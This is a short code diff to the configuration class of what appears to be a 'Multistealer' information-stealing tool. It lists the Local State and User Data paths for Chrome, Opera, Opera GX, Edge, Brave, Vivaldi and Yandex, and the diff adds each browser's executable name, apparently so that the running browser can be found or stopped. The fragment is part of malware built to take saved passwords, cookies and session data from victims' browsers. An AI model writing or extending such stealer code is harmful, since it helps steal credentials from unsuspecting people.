@@ -56,36 +56,43 @@ class MultistealerConfig:
     ChromePaths = (
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
+        "chrome.exe"
     )
 
     OperaGXPaths = (
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
+        "opera.exe"
     )
 
     OperaDefaultPaths = (
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
+        "opera.exe"
     )
 
     MicrosoftEdgePaths = (
         rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
         rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
+        "msedge.exe"
     )
 
     BravePaths = (
         rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
         rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "brave.exe"
     )
 
     VivaldiPaths = (
         rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
         rf"{user_profile}\AppData\Local\Vivaldi\User Data",
+        "vivaldi.exe"
     )
 
     YandexPaths = (
         rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
         rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
+        "browser.exe"
     )
 
 
